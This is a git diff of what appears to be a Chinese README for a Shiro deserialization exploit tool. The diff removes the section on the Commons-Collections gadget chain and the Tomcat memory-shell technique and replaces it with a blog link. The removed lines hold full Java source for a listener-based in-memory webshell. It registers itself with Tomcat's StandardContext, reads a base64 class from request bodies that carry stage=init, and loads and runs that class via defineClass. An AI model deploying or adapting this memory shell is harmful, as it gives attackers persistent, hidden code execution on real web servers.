@@ -36,64 +36,9 @@
 
 ![1](./images/1.png)
 
-### 利用链
+### 原理介绍
 
-Commons-CollectionsK1_1 和K1的区别基本上只是我用的是InstantiateTransformer,K1用的是InvokerTransformer
-
-总结:几乎一样
-
-### 内存马和回显方法
-
-使用listener注入,相比于使用servlet来说,不会被shiro拦,只要tomcat能解析的路径就能上线内存马,不用怕shirofilter匹配*的情况,例如P师傅的shirodemo环境(2021强网杯hard pentest,如下图)
-
-![](./images/5.png)
-
-
-
-并且defineclass直接加载了pageContext类(有的时候没有依赖导致注入失败)
-
-另外我这边同一个listener同时实现命令执行回显和内存马,命令执行回显可以GBK编码
-
-核心逻辑为实现一个Listener同时继承AbstractTranslet类并且实现ServletRequestListener接口来加载任意类并调用方法
-
-```JAVA
-public class Init extends AbstractTranslet implements ServletRequestListener  {
-    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { }
-    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }
-    public Init() throws Exception {
-        super();
-        super.namesArray = new String[]{"ccdr4gon"};
-        WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-        StandardContext standardCtx = (StandardContext)webappClassLoaderBase.getResources().getContext();
-        standardCtx.addApplicationEventListener(this);
-    }
-
-    @Override
-    public void requestDestroyed(ServletRequestEvent sre) {}
-    @Override
-    public void requestInitialized(ServletRequestEvent sre) {
-        try {
-            RequestFacade requestfacade= (RequestFacade) sre.getServletRequest();
-            Field field = requestfacade.getClass().getDeclaredField("request");
-            field.setAccessible(true);
-            Request request = (Request) field.get(requestfacade);
-            if (request.getParameter("stage").equals("init")) {
-                StringBuilder sb = new StringBuilder("");
-                BufferedReader br = request.getReader();
-                String str;
-                while ((str = br.readLine()) != null) {
-                    sb.append(str);
-                }
-                byte[] payload = Base64.getDecoder().decode(sb.toString());
-                Method defineClass = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-                defineClass.setAccessible(true);
-                Class clazz = (Class) defineClass.invoke(Thread.currentThread().getContextClassLoader(), payload, 0, payload.length);
-                clazz.newInstance();
-            }
-        }catch (Exception ignored){ }
-    }
-}
-```
+请移步 https://ccdragon.cc/?p=3103
 
 ### 本地测试过的中间件版本
 
@@ -166,5 +111,7 @@ LandGrey
 
 Lucifaer
 
-等公开发表过Tomcat内存马/回显以及Shiro利用方式文章的师傅
+c0ny1
+
+等等师傅们
 
